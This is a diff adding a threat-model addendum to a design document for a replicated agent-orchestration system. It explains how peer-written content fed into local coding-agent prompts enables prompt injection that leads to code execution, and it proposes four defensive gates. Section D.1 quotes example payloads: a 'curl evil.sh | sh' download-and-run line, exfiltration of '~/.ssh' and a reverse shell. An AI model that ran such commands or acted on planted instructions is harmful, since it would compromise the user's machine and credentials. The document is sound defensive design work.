@@ -623,3 +623,72 @@ apply/projection, **at the cost of** the forged-op / flood / no-removal /
 deterministic-`apply` burden. Deciding question unchanged: is canonical global
 ordering (mainly claim/queue arbitration) worth A's trust+coordination tax — or
 can ordering be GitHub-anchored, making B's lighter, safer model the better fit?
+
+# Addendum D (2026-05-31) — Threat-model correction: the gate protects the USER, not the state
+
+This addendum **reframes what the "security layer" is for** and supersedes the
+parts of §1–§6 that treat per-op signature verification + `addWriter` admission
+as the headline defense. The reframe came from one observation (owner,
+2026-05-31): *"If a repo wants to protect their PRs they should do it at the
+GitHub gate level anyway — Papercusp is just one possible submitter. What we
+need to protect is users from running prompts on their machine that are
+malicious to the user."*
+
+## D.1 — Two corrections to the original framing
+
+**(1) Merge authority is GitHub's gate, not ours.** PRs merge through the GitHub
+REST API with a real user token; GitHub's branch-protection + write-access rules
+already decide who may merge. Papercusp is one submitter among many. Signing
+Autobase ops to "protect PR/feature integrity" **duplicates a gate GitHub
+already owns** — so per-op-signing-*for-merge-authority* is largely redundant.
+(Provenance is still worth capturing — see G1 — but as attribution, not as a
+reject gate.)
+
+**(2) The real threat is the confused deputy.** Replicated state is not merely
+data we display — it becomes **prompt material fed to coding agents that run on
+the user's machine, with the user's shell and tokens.** A malicious (or
+admitted-but-compromised) peer who can write into your replicated state can
+plant a "feature", "supervisor note", "inter-agent message", or "memory" entry
+whose text is really `curl evil.sh | sh` / "exfiltrate `~/.ssh`" / "open a
+reverse shell" — and your local orchestrator/worker, reading it as a legitimate
+work item, **executes it with your machine's authority.** This is prompt
+injection → local code execution. **Op-signing does not fix this**: a
+signed-but-malicious instruction, or a legit peer whose content is dangerous,
+still injects. The defense must sit on the *content→agent→execution* path, not
+on op authenticity.
+
+## D.2 — The dangerous flow (one pipeline)
+
+```
+remote peer writes op → replicated → projected into local PG
+   → prompt-assembly feeds it to an agent → spawn claude/omp/codex locally
+   → agent runs tools/shell with the user's authority
+```
+
+The gate must sit at the transition from **untrusted replicated content** to
+**work the local machine acts on autonomously.**
+
+## D.3 — The four gates, with the exact code seams (mapped 2026-05-31)
+
+| Gate | Seam | Insertion point (`file:line`) | State today |
+|---|---|---|---|
+| **G1 — Provenance** | projection: replicated op → local PG | `apps/operator/lib/sync/hyperbee/projection.ts:58` (`applyHyperbeeOpToPg`); the 8 writers under `projections/` | `op.writerPubkey` is **available at `projection.ts:75`** but only used for clobber-detection then discarded. No actionable table (`feature_queue`, `harness_features_consolidated`, `issues`) carries an author or `origin: local\|remote` column. **The foundation: thread `writerPubkey` through, stamp `author_pubkey` + `origin`.** This is the one piece of the old op-auth work that stays load-bearing — for *attribution*, not rejection. |
+| **G2 — Work-admission** (PRIMARY) | orchestrator feature-pick | `packages/orchestrator/src/state-pg.ts:82-94` (`readFeaturesPg` — the hard SQL eligibility filter; pick→spawn chain `main-loop.ts:569 → handleNextWorker:970 → setFeatureStatus in_progress:1114 → invoke worker:1127 → spawn invoke.ts:1160`) | Eligibility = started-plan only; **zero authorship gate**. `created_by_github_user_id` exists (migration 080) but is unused here. **Gate: remote-authored actionable content is *advisory* — it may be proposed but can never auto-spawn a local agent without local-human admission.** Maps onto the existing `needs-human` / approval-gate model. |
+| **G3 — Untrusted-data framing** | prompt assembly | `packages/orchestrator/src/prompt-build.ts:218-221` (feature notes / debugger findings / inter-agent messages interpolated **verbatim**), joined `:299` | Remote-writable vectors (messages from any harness → any feature, debugger findings, feature notes) become plain prompt instructions with **no untrusted-data delimiter**. **Gate: wrap remote-authored content as clearly-delimited third-party DATA, never instructions.** |
+| **G4 — Spawn least-privilege** (last line) | local agent spawn | `apps/operator/lib/harness-launch.ts:45-76` + `harness-invoke-once.ts:48-69`; spawn `invoke.ts:1073-1078` | Child inherits **`...process.env` (all secrets) + the admin `DATABASE_URL` + decrypted search-provider keys**, and **no sandbox**. MCP tool catalog *is* role-gated server-side (`spawn-mcp.ts` signed URL → `verifySpawnParams`). **Gate: hand the child only the env/tokens its role needs; tighten the tool/shell permission surface.** |
+
+## D.4 — The one-sentence principle
+
+**Replicated content is untrusted input — it may inform and propose, but it must
+never autonomously drive code execution on the local machine without
+local-human admission.**
+
+## D.5 — What this means for the build (retargets §7 + the "security layer" task)
+
+The implementation pivots away from `addWriter` / op-signing-for-merge and toward
+the four-gate user-protection model: **G1 provenance** (the prerequisite),
+**G2 work-admission** (the primary gate, the cheapest high-leverage win — one
+predicate at `readFeaturesPg`), **G3 untrusted-data framing**, **G4 spawn
+least-privilege**. G1+G2 are model-independent (they apply whether the substrate
+is Autobase-A or per-peer-logs-B), so they can land **before** the B rewrite.
+Full sequencing in the plan: `papercusp-user-protection-gate-2026-05-31`.
